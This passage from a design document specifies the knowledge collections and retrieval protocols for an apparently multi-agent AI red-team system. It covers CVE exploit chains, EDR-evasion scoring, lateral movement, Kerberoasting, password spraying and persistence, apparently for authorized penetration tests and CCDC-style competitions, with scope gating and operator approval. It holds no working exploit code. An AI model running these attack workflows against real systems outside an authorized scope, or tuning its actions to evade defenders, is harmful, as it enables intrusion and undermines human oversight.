**Format:** Service version → vulnerability + POC link mapping.

---

### 7. **OSINT & Pre-Engagement Templates**
**What:** Shodan/Censys query syntax, certificate transparency log parsing (crt.sh API), ASN-to-IP conversion (bgp.tools), WHOIS workflows, LinkedIn harvesting (TheHarvester), Wayback Machine API for legacy endpoints.

**Why:** JOLIOT accelerates OSINT phase; reduces command construction errors; provides API templates for 100+ IP range enumeration.

**Format:** Query templates + API call examples + output parsing scripts.

---

## Priority Content Types (Ranked)

| **Priority** | **Type** | **Format** | **Update Cadence** |
|---|---|---|---|
| **CRITICAL** | CVE-Exploitation Reference | JSON | Weekly (new CVEs daily) |
| **CRITICAL** | Event ID → Detection Mapping | Table + tree | Monthly (EDR/SIEM updates) |
| **HIGH** | Lateral Movement Decision Tree | Flowchart + syntax | Quarterly (new techniques) |
| **HIGH** | Credential Attack Workflows | Pipeline templates | Quarterly (tool updates) |
| **HIGH** | AD Architecture & Kerberos | Decision tree + commands | Annually (schema stable) |
| **MEDIUM** | CCDC/CPTC Inventory | Service → exploit mapping | Annually (competition stable) |
| **MEDIUM** | OSINT Templates | Query syntax + API | Bi-weekly (service changes) |

---

## Coverage Gaps (Realistic Honesty)

| **Gap** | **Impact** | **Mitigation** |
|---|---|---|
| **Real-time CVE Patches** | New 0-days invalidate chains within hours; library cannot match NVD publication rate. | Agents retain GitHub POC scraping; library serves as "known-good" baseline. Retrieval response flags "check GitHub before exploit." |
| **Blue Team Capability Intelligence** | Each engagement has different SIEM/EDR/DLP posture. Library cannot encode target-specific threat model. | GROVES accepts injected Blue Team profile at engagement init. Vector retrieval supplements, doesn't replace. |
| **Target Network Architecture** | CCDC topology varies annually; customer networks are bespoke. Library contains patterns, not specifics. | JOLIOT builds live ATTACK-SURFACE-MAP.md during recon; vector retrieval informs prioritization but JOLIOT discoveries override generic patterns. |
| **Proprietary EDR Signatures** | Vendor-confidential detection patterns not publicly disclosed. Under-represents high-end EDR evasion. | Accept knowledge gap; GROVES risk-scores conservatively for unknown products; engage vendor documentation when available. |
| **Blue Team Response Timing** | Alert thresholds, SOAR automation, human-in-loop delay vary per engagement. Library contains static baselines. | GROVES monitors DETECTION-RISK-LOG.md in real time and adjusts timing dynamically. Library provides baseline; GROVES adapts. |

---

## Update Frequency

**Overall Strategy:** Stagger updates by collection to avoid bottlenecks. Automation recommended for CVE parsing (NVD API feed → JSON weekly). CCDC/CPTC content triggers on competition schedule publication. Event ID mappings track EDR release notes monthly.

**Integration Point:** Lattice VRA should ingest updates via scheduled batch jobs (Thursday night for Friday morning availability) with versioning to prevent mid-session retrieval inconsistency.

---

**END OUTPUT B — LIBRARY SPECIFICATION**

---

# LATTICE COLLECTION DESIGN

# LATTICE COLLECTION DESIGN: OFFENSIVE-SECURITY-OPS

*Phase 2b — T2 Library Specification (NEUTRON/GROVES) → Lattice Collection Design*  
*For operator review and approval before fabrication*

---

## Assessment of Library Specification

NEUTRON's specification is comprehensive and exceptionally actionable. Seven agent roles map cleanly to discrete kill-chain phases; five coordination files have explicit entry templates; seven suggested collections align directly with agent information needs. The spec explicitly mandates **persistent state across multi-session engagements** and **real-time risk propagation from GROVES to execution agents**—both strong vectorization drivers.

**Assumptions I filled in:** NEUTRON specifies format (JSON for CVE reference, tables for Event ID mapping, decision trees for lateral movement) but not chunking granularity. I've recommended document-level chunking per CVE class, Event ID family, decision context, and AD concept. Embedding model: **all-mpnet-base-v2** (per VRA consensus for heterogeneous red-team content spanning security, infrastructure, and governance domains).

**Critical clarification required:** DETECTION-RISK-LOG is mission-critical for GROVES' real-time OPSEC gating, but vectorizing a live log stream is operationally unusual. See **Questions for Operator** below.

---

## Collection Architecture

#### 1. CVE-Exploitation-Reference
**Purpose:** Maps CVE ID → exploit chain (tool, source, payload staging) → detection signatures → evasion bypasses. LAWRENCE converts JOLIOT's CVE discoveries into executable payloads; BETHE chains privilege-escalation exploits; GROVES extracts detection signatures for risk scoring.

**Source of truth:** T2 Library Specification "CVE-Exploitation Reference" | augmented with NVD API feeds + Exploit-DB snapshots (weekly batch).

**Content type:** Structured entries (JSON, one CVE per document).

**Chunking strategy:** Document-level: one document per CVE class (CVE-2017-0144, CVE-2020-1472, SQL-Injection-Time-Blind, etc.). Each: CVE ID, affected products/versions, CVSS, PoC source (URL + tool), exploitation pipeline (exact command syntax), reverse-shell staging method, detection signatures (Event IDs + EDR alert patterns), evasion bypass technique.

**Embedding model:** all-mpnet-base-v2 — reason: CVE data spans security (exploit chains), infrastructure (network staging), tooling (Metasploit, sqlmap, ysoserial) semantics; all-mpnet-base-v2 handles cross-domain semantic similarity better than security-only models.

**Ingest sources:** NVD API (weekly automated JSON parsing); Exploit-DB (manual high-CVSS curation); GitHub POC repos (reference links only); internal CCDC playbooks.

**Refresh cadence:** Weekly (NVD publishes ~50 new CVEs/week). Timestamp all documents; agents filter `last_refreshed > [engagement_start]` to avoid mid-session inconsistency.

**Mandatory metadata fields:** `status` (active|deprecated|burned|verified), `engagement_id`, `source_type` (nvd|exploit_db|github|ccdc_playbook), `last_refreshed`, `chunk_index`, `cvss_score`, `target_products`, `detection_event_ids`.

**Estimated collection size:** ~500–1000 documents (NVD ~230K total CVEs; library focuses on remote/priv-esc/persistence exploitation; CCDC playbooks add ~50–100 verified entries/year).

---

#### 2. Windows-Event-ID-Detection-Mapping
**Purpose:** Maps Windows Event IDs (7045=service, 4769=Kerberos TGS, 10=LSASS, 4698=task, 20730=WMI) to agent actions, detection confidence, and evasion alternatives. GROVES queries to score real-time risk; agents query to select tactics with acceptable detection footprint.

**Source of truth:** T2 Library Specification "Windows Event ID → Agent Action Mapping" | enriched with EDR vendor release notes (CrowdStrike, Sentinel One, Tanium).

**Content type:** Structured entries (one document per Event ID family).

**Chunking strategy:** One document per Event ID cluster (e.g., "Service Creation (Event 7045)" contains service creation events, detection triggers, evasion alternatives, timing constraints). Each: Event ID, trigger action (which agent tools), detection confidence (high|medium|low), false-positive frequency, EDR-specific variants (vendor-specific patterns), evasion tactics (e.g., if PsExec detected → use WMI instead), timing constraints (spread 60+ sec apart).

**Embedding model:** all-mpnet-base-v2 — reason: Event ID semantics are Windows/EDR-specific, but evasion decisions depend on tool chain semantics (PsExec, WMI, SMB Relay, scheduled tasks) and infrastructure relationships; all-mpnet-base-v2 is strong on infrastructure/tooling semantics.

**Ingest sources:** Microsoft Event ID documentation; EDR vendor release notes (CrowdStrike, Sentinel One, Tanium, Carbon Black); MITRE ATT&CK Event ID mappings; internal CCDC blue-team playbook.

**Refresh cadence:** Monthly (EDR detection logic updates frequently; Windows event schema stable).

**Mandatory metadata fields:** `status`, `engagement_id`, `source_type` (microsoft|crowdstrike|sentinel_one|mitre|internal), `last_refreshed`, `chunk_index`, `event_id`, `detection_confidence`, `edr_variants` (JSON).

**Estimated collection size:** ~50–100 documents (red team focus: ~20–30 high-confidence detections; ~50 related event families).

---

#### 3. Lateral-Movement-Decision-Tree
**Purpose:** Decision logic for FERMI: select tactic (PsExec vs. WMI vs. SMB Relay vs. SSH key injection vs. Pass-the-Hash) based on OS, account privileges, EDR posture, network segmentation. Encodes expected detection risk per tactic.

**Source of truth:** T2 Library Specification "Lateral Movement Decision Tree" | informed by CCDC/CPTC topology patterns + observed blue-team defensive strategies.

**Content type:** Structured entries (decision trees as nested logic + syntax references).

**Chunking strategy:** One document per decision context (e.g., "Windows Domain Admin on Win10 & EDR Unknown", "Linux with sudo capability", "Kerberos-disabled network", "Segmented network with SMB relay potential"). Each: context (OS, account type, EDR posture, network config), selected tactic, exact command syntax (with example IPs), timing constraints (delay between commands), expected detection risk score, fallback if tactic fails, real-world CCDC success rates.

**Embedding model:** all-mpnet-base-v2 — reason: Decision trees mix infrastructure (OS, account model, topology), tool semantics (PsExec, WMI, impacket modules), risk terminology; all-mpnet-base-v2 handles heterogeneous semantic linking.

**Ingest sources:** Internal red team playbooks (multi-year CCDC/CPTC experience); impacket documentation + examples; Windows WMI/RPC references; CCDC blue-team response logs (what triggered alerts vs. evaded).

**Refresh cadence:** Quarterly (new lateral movement techniques emerge 2–3x/year; core Windows/AD mechanics stable).

**Mandatory metadata fields:** `status`, `engagement_id`, `source_type` (internal_playbook|documentation|ccdc_experience), `last_refreshed`, `chunk_index`, `context_os`, `context_account_type`, `context_edr_posture`, `selected_tactic`, `detection_risk_score`, `expected_success_rate_ccdc`.

**Estimated collection size:** ~40–80 documents (one per distinct decision context).

---

#### 4. Active-Directory-Architecture-Kerberos-Workflows
**Purpose:** Domain trust relationships, service account delegation chains, constrained delegation abuse (RBCD relay), golden ticket creation, BloodHound edge semantics. BETHE queries for escalation chains; FERMI uses for lateral movement planning; CHADWICK uses for persistence selection.

**Source of truth:** T2 Library Specification "Active Directory Architecture & Kerberos Workflows" | supplemented with Microsoft AD documentation + Harmj0y research (Rubeus, Kerberoasting).

**Content type:** Structured entries (decision trees + command references).

**Chunking strategy:** One document per major AD concept (e.g., "Child-to-Parent Domain Escalation via SIDHistory", "Constrained Delegation RBCD Relay", "Golden Ticket Creation (Rubeus Syntax)", "BloodHound Edge Types & Exploitation", "Service Account Privilege Escalation Chains"). Each: conceptual explanation, prerequisites, step-by-step exploitation (exact commands), detection signatures (Event IDs + audit trails), timing constraints, PoC code references.

**Embedding model:** all-mpnet-base-v2 — reason: AD architecture is infrastructure-specific, but exploitation chains span security (Kerberos cryptography), infrastructure (domain trust topology), tooling (Rubeus, BloodHound, impacket); all-mpnet-base-v2 balances these domains.

**Ingest sources:** Microsoft AD documentation; Harmj0y AD research; BloodHound documentation; CCDC winning team writeups.

**Refresh cadence:** Annually (AD architecture schema stable; new exploitation techniques emerge 1–2x/year, typically via conference research).

**Mandatory metadata fields:** `status`, `engagement_id`, `source_type` (microsoft|research|bloodhound|ccdc_writeup), `last_refreshed`, `chunk_index`, `concept_name`, `prerequisites`, `detection_risk_score`.

**Estimated collection size:** ~20–40 documents (one per major AD/Kerberos concept).

---

#### 5. Credential-Attack-Workflows
**Purpose:** Password spray lockout-aware logic (5-failure/30-min threshold, 300-sec delays), Kerberoasting pipeline (GetUserSPNs → Hashcat mode 13100 → DA identification), AS-REP roasting, LDAP enumeration filters. LAWRENCE queries for tool parameters; BETHE uses for Kerberoasting to identify DA targets.

**Source of truth:** T2 Library Specification "Credential Attack Workflows" | enriched with tool documentation (spray.py, GetUserSPNs.py, Hashcat modes) + CCDC account naming conventions.

**Content type:** Structured entries (pipeline templates with exact syntax + timing constraints).

**Chunking strategy:** One document per attack workflow (e.g., "Password Spray Lockout-Safe Logic", "Kerberoasting End-to-End", "AS-REP Roasting", "LDAP Enumeration for Non-Disabled Accounts", "Rainbow Table Acceleration"). Each: step-by-step commands (exact syntax + parameter values), timing constraints (delay between requests), common password lists (Password123!, Summer2025, CCDC patterns), account targeting heuristics (avoid monitored admins), prior CCDC success rates.

**Embedding model:** all-mpnet-base-v2 — reason: Credential attacks mix security (password hashing, Kerberos), infrastructure (LDAP, domain structure), tooling (spray.py, Hashcat, GetUserSPNs), operational safety (lockout thresholds); all-mpnet-base-v2 handles cross-domain semantic linkage.

**Ingest sources:** spray.py documentation + CCDC patches; GetUserSPNs.py + Hashcat documentation; CCDC team playbooks; LDAP schema reference.

**Refresh cadence:** Quarterly (tool updates, new Hashcat modes, new CCDC credential patterns discovered).

**Mandatory metadata fields:** `status`, `engagement_id`, `source_type` (documentation|ccdc_playbook|tool_reference), `last_refreshed`, `chunk_index`, `workflow_name`, `attack_type` (spray|kerberoast|asrep|ldap), `success_rate_ccdc`, `lockout_risk`.

**Estimated collection size:** ~30–50 documents (one per credential attack workflow).

---

#### 6. CCDC-CPTC-Vulnerability-Inventory
**Purpose:** Competition-specific vulnerabilities (Apache 2.4.41 mod_userdir RCE, Samba 3.5.x RCE, unpatched kernels, world-writable logs), default credentials, typical topology, scoring infrastructure patterns (NRPE on 5666, web scorers on 80/443). JOLIOT accelerates enumeration by targeting known-vulnerable services; LAWRENCE prioritizes high-probability exploits.

**Source of truth:** T2 Library Specification "CCDC/CPTC Vulnerability Inventory" | augmented with competition schedule, historical team writeups, scoring infrastructure documentation.

**Content type:** Structured entries (service version → vulnerability mapping + PoC reference).

**Chunking strategy:** One document per vulnerable service class (e.g., "Apache 2.4.41 mod_userdir RCE", "Samba 3.5.x RCE", "Linux Kernel CVEs (2024–2025 unpatched)", "NRPE Default Port Reconnaissance"). Each: service name/version, vulnerability ID (CVE or custom), PoC tool/exploit (Exploit-DB link, GitHub, Metasploit module), exploitation steps, scoring infrastructure context (typical NRPE/web scorer ports), expected success rate in CCDC.

**Embedding model:** all-mpnet-base-v2 — reason: CCDC content is infrastructure/service-specific but requires semantic linkage to tool catalogs and exploit chains.

**Ingest sources:** CCDC competition schedule + scoring infrastructure docs; winning team writeups; NVD for Linux/service CVEs; Exploit-DB; internal CCDC historical playbooks (2015–2026).

**Refresh cadence:** Annually (synchronized with CCDC competition schedule publication). Off-season: incremental updates for newly-discovered service vulnerabilities.

**Mandatory metadata fields:** `status`, `engagement_id`, `source_type` (ccdc_writeup|nvd|exploit_db|competition_doc), `last_refreshed`, `chunk_index`, `service_name`, `vulnerable_versions`, `competition_presence` (2025_ccdc|2026_ccdc|both|historical).

**Estimated collection size:** ~100–200 documents (one per vulnerable service variant + scoring infrastructure pattern).

---

#### 7. OSINT-Pre-Engagement-Templates
**Purpose:** Shodan/Censys query syntax, certificate transparency log parsing (crt.sh API), ASN-to-IP conversion, WHOIS workflows, LinkedIn harvesting (TheHarvester), Wayback Machine API. JOLIOT queries to accelerate OSINT phase; reduces command construction errors; templates for 100+ IP range enumeration.

**Source of truth:** T2 Library Specification "OSINT & Pre-Engagement Templates" | enriched with API documentation (Shodan, Censys, crt.sh, bgp.tools, hunter.io).

**Content type:** Structured entries (query templates + API examples + parsing scripts).

**Chunking strategy:** One document per OSINT data source (e.g., "Shodan Query Syntax & Filters", "Censys Certificate Transparency Parsing", "ASN-to-IP Range Conversion", "WHOIS Bulk Enumeration", "LinkedIn Harvesting", "Wayback Machine API for Legacy Endpoints"). Each: API endpoint URL, authentication (placeholder), query syntax with examples, output format, parsing script (Python snippet), rate-limiting constraints, cost implications (paid tiers).

**Embedding model:** all-mpnet-base-v2 — reason: OSINT integrates multiple service APIs (distinct query syntax) with overlapping semantic goals (IP discovery, service enumeration); all-mpnet-base-v2 handles API syntax + semantic linkage across sources.

**Ingest sources:** Shodan, Censys, crt.sh, bgp.tools, hunter.io, Wayback Machine API documentation; TheHarvester source code + community examples; internal OSINT playbooks (which queries succeed for 100+ IP ranges, real-world rate-limiting experience).

**Refresh cadence:** Bi-weekly (service APIs change; Shodan/Censys filter syntax updates).

**Mandatory metadata fields:** `status`, `engagement_id`, `source_type` (official_api_docs|community_tools|internal_playbook), `last_refreshed`, `chunk_index`, `osint_source`, `requires_paid_tier`, `rate_limit_requests_per_second`.

**Estimated collection size:** ~25–40 documents (one per OSINT data source + parsing technique).

---

#### [LATTICE ADDITION] Engagement-Context-Profile
**Purpose:** Per-engagement metadata injected at initialization: Blue Team defensive posture (EDR product + version, SIEM capabilities), approved techniques, target environment profile (AD domain structure, network segmentation), rules of engagement, compliance constraints. GROVES reads at init to calibrate risk thresholds; JOLIOT queries for recon scope calibration; all agents reference for scope validation.

**Source of truth:** Lattice addition based on Priority Content Types + GROVES' mandatory gating responsibilities.

**Content type:** Structured entries (JSON, one document per engagement).

**Chunking strategy:** One document per engagement (identified by `engagement_id`). Content: Blue Team profile (EDR product/version, SIEM capability level, IDS/IPS posture, incident response SLA), approved technique list, target environment snapshot (AD domain count, network segment count, critical servers, approved scope ranges), rules of engagement (ROE), compliance constraints (no DNS poisoning, no DoS, etc.), operator contact for scope escalation.

**Embedding model:** all-mpnet-base-v2 — reason: Engagement context mixes infrastructure (network topology, EDR product names), governance (ROE, compliance), and security (Blue Team capabilities).

**Ingest sources:** Operator briefing at engagement initialization (manual input); import from ENGAGEMENT-SCOPE.md and JOLIOT-discovered Blue Team posture.

**Refresh cadence:** Once per engagement at initialization; updated on-demand if ROE changes or Blue Team posture detected to differ from expected.

**Mandatory metadata fields:** `status` (active|paused|completed), `engagement_id`, `source_type` (operator_briefing|discovered), `last_refreshed`, `chunk_index`, `edr_product`, `edr_version`, `siem_capability_level` (high|medium|low), `approved_techniques`, `scope_ip_ranges`, `blue_team_sla_hours`.

**Estimated collection size:** Small (one document per active engagement; 10–20 concurrent engagements = 10–20 documents).

---

#### [LATTICE ADDITION] Operational-State-Current
**Purpose:** Persistent, queryable versions of OPERATIONAL-TIMELINE.md and ATTACK-SURFACE-MAP.md for **same-session reads** by agents (FERMI queries JOLIOT's discovered hosts; BETHE queries LAWRENCE's captured credentials; CHADWICK queries FERMI's persistence points). Decouples agent dependency from file-based coordination.

**Source of truth:** Lattice addition to enable real-time state reads across all 7 agents during active engagements.

**Content type:** Structured entries (JSON, updated real-time as agents execute actions).

**Chunking strategy:** Two sub-collections:
- **Operational-Timeline-Active:** Chronological action log (agent, timestamp, action, outcome, risk score). One document per action or per hour. Chunked for quick time-range queries ("all FERMI lateral movements in past 30 min").
- **Attack-Surface-Map-Active:** Host/service/credential inventory. One document per discovered host or network segment. Updated as JOLIOT discovers services, LAWRENCE captures credentials, FERMI finds persistence.

**Embedding model:** all-mpnet-base-v2 — reason: Operational state mixes timeline data (chronological), host inventory (infrastructure), action semantics (exploit chains), outcome summaries.

**Ingest sources:** Direct writes from agents as they execute actions. SZILARD exports final versions to client-facing reports at engagement end.

**Refresh cadence:** Real-time (millisecond-level updates as agents report actions).

**Mandatory metadata fields:** `status` (active|archived), `engagement_id`, `source_type` (agent_report), `last_refreshed`, `chunk_index`, `action_timestamp`, `agent_codename`, `action_type` (exploit|lateral_movement|priv_escalation|persistence|credential_harvesting), `outcome_summary`.

**Estimated collection size:** Moderate (one action per agent decision ~50–200 actions/multi-day engagement; ~20–50 host entries per target network).

---

## Implementation Notes

1. **Real-time risk propagation (CRITICAL):** DETECTION-RISK-LOG is mission-critical for GROVES but vectorizing a live log stream is operationally unusual. **Two solutions:**
   - **Option A (Recommended):** Vectorize "Risk Scoring Rules" (abstract decision logic: "PsExec = +40 base risk") instead of raw log entries. GROVES queries rules to assess risk, then logs outcomes to OPERATIONAL-TIMELINE (vectorized separately).
   - **Option B:** Batch-ingest DETECTION-RISK-LOG every 10 min with separate "Risk Aggregation" logic in GROVES agent to synthesize scores from recent entries.
   
   **⚠️ Operator must specify approach before fabrication.**

2. **CVE collection versioning:** NVD adds ~50 CVEs/week. Vectorize with ingestion timestamp; agents filter `last_refreshed > [engagement_start]` to avoid mid-engagement inconsistency. Consider immutable collection snapshots at engagement start to prevent retrieval drift.

3. **Event ID multi-vendor complexity:** EDR vendors emit divergent variants (CrowdStrike vs. Sentinel One). **Recommend:** One master document per Event ID, with `edr_variants` JSON field listing vendor-specific patterns. Query includes vendor type in filter.

4. **State persistence across sessions:** Recommend shared Qdrant or ChromaDB HTTP instance for all 7 agents. OPERATIONAL-STATE-CURRENT collection survives session boundaries; agents query for context from prior hours/days. Partition by `engagement_id` metadata, not isolated collections per engagement.

5. **Scope enforcement is load-bearing:** GROVES must gate every phase transition. Use `engagement_id` + `approved_techniques` metadata to gate retrieval; agents cannot read collections outside authorized scope.

6. **Blue Team profile injection (dynamic):** ENGAGEMENT-CONTEXT-PROFILE is initialized by operator but updated in-band as JOLIOT discovers additional Blue Team posture. GROVES re-queries to adjust risk thresholds dynamically. Build versioning into the collection to track posture changes over time.

---

## Questions for Operator

1. **DETECTION-RISK-LOG vectorization strategy (LOAD-BEARING):** Should Lattice vectorize (a) raw log entries as-is with live streaming updates, (b) abstract "Risk Scoring Rules" collection that GROVES queries, or (c) hybrid where rules are vectorized + GROVES maintains local rule engine? **Specify before fabrication.**

2. **OPERATIONAL-TIMELINE dual-use:** Is it written by agents during engagement (for state reads by downstream agents) AND read by SZILARD at engagement end (compliance reporting)? Or write-only by SZILARD post-hoc? **Affects vectorization cadence (real-time vs. batch).**

3. **ATTACK-SURFACE-MAP versioning:** Do we version per-engagement (snapshot at init, final at end) or accumulate across engagements (JOLIOT reuses prior target intelligence)? **Affects collection design (isolated partitions vs. persistent cross-engagement inventory).**

4. **CCDC/CPTC historical depth:** Include 2015–2024 historical vulnerability data, or limit to 2025/2026? Historical scope trades storage for broader pattern matching but risks introducing noise (deprecated CVEs). **Specify minimum/maximum competition years.**

5. **Blue Team capability intelligence uncertainty:** In real assessments, Blue Team posture is often unknown at engagement start; JOLIOT discovers it during recon. Should GROVES ingest "discovered EDR product" updates in real-time, or operate conservatively under unknown-posture assumptions? **Affects risk threshold calibration.**

6. **Agent retrieval architecture:** Do agents pre-fetch relevant collections at task start (injected into prompt), or query Lattice on-demand during execution? **Affects VRP design and latency tolerances.**

---

## Vector Retrieval Protocol Skeleton

**[GROVES—OPSEC & Evasion Coordinator]**
- **Collections:** Engagement-Context-Profile, Windows-Event-ID-Detection-Mapping (via Risk Scoring Rules), Operational-State-Current (recent actions), ENGAGEMENT-SCOPE.md reference.
- **Query trigger:** At engagement initialization (load Blue Team profile + scope rules); after every agent action (risk re-assessment); on ESCALATE-RISK operator command.
- **Query formulation:** "Risk score for action [agent, tool, target_os]: baseline + evasion credit/penalty"; "Is [technique] within approved scope?"; "Which recent actions triggered Blue Team alerts?"
- **Injection point:** GROVES system prompt (Blue Team profile, scope boundaries, risk thresholds loaded at init). GROVES queries at inference time before authorizing agent actions.
- **Citation format:** Risk scores inline: "[ACTION: PsExec on Win10] [BASE RISK: +40 per Event-7045] [EVASION: WMI alternative +20 per Lateral-Movement-Decision-Tree]."
- **Fallback (MANDATORY):** If retrieval unavailable: GROVES reverts to conservative risk model (all unknown actions = +100 risk, require explicit operator approval). Does not authorize action if Blue Team profile unavailable.

---

**[JOLIOT—Reconnaissance & Intelligence]**
- **Collections:** OSINT-Pre-Engagement-Templates, CCDC-CPTC-Vulnerability-Inventory, Engagement-Context-Profile (approved scope + Blue Team posture for recon calibration), CVE-Exploitation-Reference (severity for prioritization).
- **Query trigger:** At task start (load OSINT templates); on-demand as IP ranges discovered (query for known-vulnerable services in inventory).
- **Query formulation:** "OSINT query template for IP range [range]: Shodan/Censys/DNS/WHOIS commands"; "Which services in [discovered IPs] match CCDC inventory?"; "What CVEs affect [service version]?"
- **Injection point:** Prepend OSINT templates to task prompt. Append CCDC inventory matches as prioritized target list post-enumeration.
- **Citation format:** "Service Apache 2.4.41 on 10.0.1.5:80 matches CCDC mod_userdir RCE (confidence high, prior CCDC success 85%) per CCDC-CPTC-Vulnerability-Inventory."
- **Fallback (MANDATORY):** If CCDC-CPTC-Vulnerability-Inventory unavailable: JOLIOT proceeds with generic nmap; LAWRENCE must check Exploit-DB manually before exploitation.

---

**[LAWRENCE—Initial Access Operator]**
- **Collections:** CVE-Exploitation-Reference, Credential-Attack-Workflows, ATTACK-SURFACE-MAP (from JOLIOT), Engagement-Context-Profile (approved techniques).
- **Query trigger:** At task start (load CVE chains); on CVE-ID from JOLIOT; on credential attack phase (load spray/Kerberoasting templates).
- **Query formulation:** "Exploitation chain for CVE-[id]: tool, exact command, payload staging, detection signatures"; "Password spray safe logic: delays, account avoidance, lockout thresholds"; "Kerberoasting pipeline: GetUserSPNs → Hashcat mode 13100 → DA targeting."
- **Injection point:** Prepend exploitation chain for each CVE. Append credential attack workflows at start of spray/Kerberoasting phase.
- **Citation format:** "Exploit: CVE-2017-0144 EternalBlue (Metasploit per CVE-Exploitation-Reference, Event 7045 + network spike per Windows-Event-ID-Detection-Mapping, risk +60)."
- **Fallback (MANDATORY):** If CVE-Exploitation-Reference unavailable: LAWRENCE queries GitHub POCs directly (loses structured metadata). If Credential-Attack-Workflows unavailable: defaults to generic spray.py (higher lockout risk).

---

**[FERMI—Post-Exploitation & Movement]**
- **Collections:** Lateral-Movement-Decision-Tree, Active-Directory-Architecture-Kerberos-Workflows, ATTACK-SURFACE-MAP (host/credential inventory), Operational-State-Current (LAWRENCE's credentials, JOLIOT's hosts), Engagement-Context-Profile (target AD structure).
- **Query trigger:** At task start (load decision tree + AD context); on-demand as new host discovered (query optimal tactic); before each lateral hop.
- **Query formulation:** "Optimal lateral movement for [source_os, account_type, target_os, edr_posture]: tactic, command, timing, risk"; "AD topology: trust relationships, delegated accounts, escalation chains"; "Credentials captured so far?"
- **Injection point:** Prepend decision tree + AD workflows at task start. Inject discovered credentials (ATTACK-SURFACE-MAP) before each movement. Append Operational-State-Current summary every 30 min.
- **Citation format:** "Lateral via WMI [per Lateral-Movement-Decision-Tree, context: Win domain-user + unknown EDR = +20 vs. PsExec +40], command: `wmiexec.py -windows-auth`, delay 60+ sec per Event-7045."
- **Fallback (MANDATORY):** If Lateral-Movement-Decision-Tree unavailable: defaults to PsExec (highest detection risk, requires GROVES approval). If AD-Architecture unavailable: lateral without trust understanding (lower success).

---

**[BETHE—Privilege Escalation]**
- **Collections:** CVE-Exploitation-Reference (priv-esc exploits), Active-Directory-Architecture-Kerberos-Workflows (domain escalation), Credential-Attack-Workflows (Kerberoasting), ATTACK-SURFACE-MAP (OS versions, service accounts), Operational-State-Current (credentials, domain structure).
- **Query trigger:** At task start (load escalation CVEs + AD chains); on new host compromised (query OS version + escalation vectors); on Kerberoasting phase.
- **Query formulation:** "Local privilege escalation for OS [version]: kernel exploits, DLL hijacking, unquoted paths, detection risk"; "Domain escalation chains for domain [name]: SIDHistory, trust abuse, Kerberoasting, golden ticket"; "Kerberoasting pipeline for DA targeting."
- **Injection point:** Prepend escalation CVEs at task start. Inject AD chains when domain escalation phase begins. Append credentials/OS versions (ATTACK-SURFACE-MAP) before each attempt.
- **Citation format:** "EternalBlue escalation (CVE-2017-0144, Metasploit per CVE-Exploitation-Reference, Event 7045 per Windows-Event-ID-Detection-Mapping, risk +60), follow with Kerberoasting (GetUserSPNs.py per Credential-Attack-Workflows)."
- **Fallback (MANDATORY):** If CVE-Exploitation-Reference unavailable: queries NVD for OS-specific CVEs (slower, no structured payloads). If AD-Architecture unavailable: attempts local escalation only.

---

**[CHADWICK—Objective Achievement]**
- **Collections:** MISSION-OBJECTIVES.md (goals, evidence requirements), ATTACK-SURFACE-MAP (persistence points, file locations), Operational-State-Current (credentials, lateral endpoints, domain structure), Active-Directory-Architecture-Kerberos-Workflows (golden ticket syntax), Credential-Attack-Workflows (persistence automation templates).
- **Query trigger:** At task start (load mission objectives + evidence requirements); on-demand as objectives marked "in-progress"; at exfiltration phase.
- **Query formulation:** "Primary objective: [name], status: [status], required evidence: [proof], ETA: [deadline]"; "Persistence mechanisms for [target_type]: scheduled tasks, WMI, registry, SSH keys, cleanup timing"; "Golden ticket creation syntax per AD-Architecture."
- **Injection point:** Prepend mission objectives + evidence requirements at task start. Inject persistence templates (AD-Architecture, Lateral-Movement-Decision-Tree) at persistence phase. Append exfiltration checklist (file hashes, PoC proof) before data staging.
- **Citation format:** "OBJECTIVE: Obtain Domain Admin credentials [per MISSION-OBJECTIVES], STATUS: In Progress (BETHE via Kerberoasting per Credential-Attack-Workflows), EVIDENCE: KRBTGT hash + golden ticket (Rubeus per AD-Architecture)."
- **Fallback (MANDATORY):** If MISSION-OBJECTIVES unavailable: CHADWICK operates without explicit guidance; executes generic "domain takeover." Operator provides objective briefing in prompt if retrieval fails.

---

**[SZILARD—Campaign Reporting & Audit]**
- **Collections:** Operational-State-Current (archived action timeline, host inventory), Engagement-Context-Profile (scope, ROE, Blue Team profile), ENGAGEMENT-SCOPE.md (authorization basis).
- **Query trigger:** At engagement end (compile final report); on-demand for compliance audits.
- **Query formulation:** "All actions by [agent] between [time1] and [time2] with risk scores"; "Scope violations or out-of-authorization actions?"; "Objective completion status + evidence artifacts?"; "Authorization source in ENGAGEMENT-SCOPE for [action]?"
- **Injection point:** Append archived Operational-State-Current + Engagement-Context-Profile to task prompt. Inject completed MISSION-OBJECTIVES as evidence validation checklist.
- **Citation format:** "Finding: CVE-2017-0144 on 10.0.1.10 [ACTION: LAWRENCE 2026-04-30T14:15Z] [AUTHORIZATION: Network Pentest scope line 2] [EVIDENCE: reverse shell command, Event 7045 log, Metasploit transcript] [RISK: +60 per Event-ID-Detection-Mapping, mitigated by WMI transition +20]."
- **Fallback (MANDATORY):** If Operational-State-Current unavailable: SZILARD compiles report from manual notes (operator provides OPERATIONAL-TIMELINE.md text); report quality degraded, may lose evidence citations.

---

**END LATTICE COLLECTION DESIGN**

---

# CURIE RESEARCH BRIEFING

# CURIE RESEARCH BRIEFING — GROVES
*Research Specialist — Fabrication pre-research*

## Terminology Map

**IOC (Indicator of Compromise):** Discrete forensic artifact (Event ID, network pattern, process behavior, registry entry, file creation) that signals attacker presence. Not equivalent to "alert threshold"—IOCs are observed facts; thresholds are human/SIEM policy decisions. GROVES accumulates IOCs; crosses threshold when count exceeds Blue Team's detection capacity.

**Detection Confidence:** Likelihood that an observed IOC triggers human analyst investigation (vs. automated noise filtering). PsExec + Event 7045 + network connection spike = high confidence (analyst investigates within 5 min). Single Event 4769 Kerberos TGS anomaly = low confidence (SIEM baseline noise at 30–40% of environments). Document per-environment confidence; assume medium for unknown environments.

**Evasion Credit:** Negative risk score applied when agent chooses lower-confidence alternative (WMI Event 20730 instead of PsExec Event 7045 = -20 credit). Credit is temporary; accumulating multiple low-confidence actions still exceeds threshold. Timing attacks (spreading requests over hours) generate -10 credit per action.

**Scope Boundary:** Authorized target ranges, approved techniques, prohibited actions. Immutable contract between penetration test operator and client. Violations are legal liability, not operational failures. GROVES blocks even high-probability actions if out of scope.

**Risk Rolling Average:** Cumulative risk across all active agents over past 60 minutes. Yellow threshold = +150 rolling (escalate-risk triggered; operator approval required). Red threshold = +250 rolling (engagement at collapse risk; immediate mitigation or halt).

## Foundational Knowledge

